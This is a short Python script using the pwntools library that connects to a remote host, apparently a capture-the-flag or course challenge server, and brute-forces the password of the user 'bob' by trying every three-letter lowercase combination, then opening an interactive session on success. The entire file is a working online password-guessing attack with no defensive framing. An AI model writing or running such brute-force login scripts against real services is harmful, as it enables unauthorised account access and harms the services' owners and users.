#!/usr/bin/env python
from pwn import *
import string
ip = "nsproj.bitisle.net"
port = 30011
s = remote(ip, port)
for i in string.ascii_lowercase:
  for j in string.ascii_lowercase:
    for k in string.ascii_lowercase:
      buf = s.recvuntil('username:')
      #print buf
      payload = "bob"
      s.sendline(payload)

      buf = s.recvuntil('password:')
      #print buf
      payload = i+j+k
      s.sendline(payload)
      buf =  s.recvline()
      print payload
      print buf
      if "FAILURE" not in buf:
          s.interactive()
      # mmm
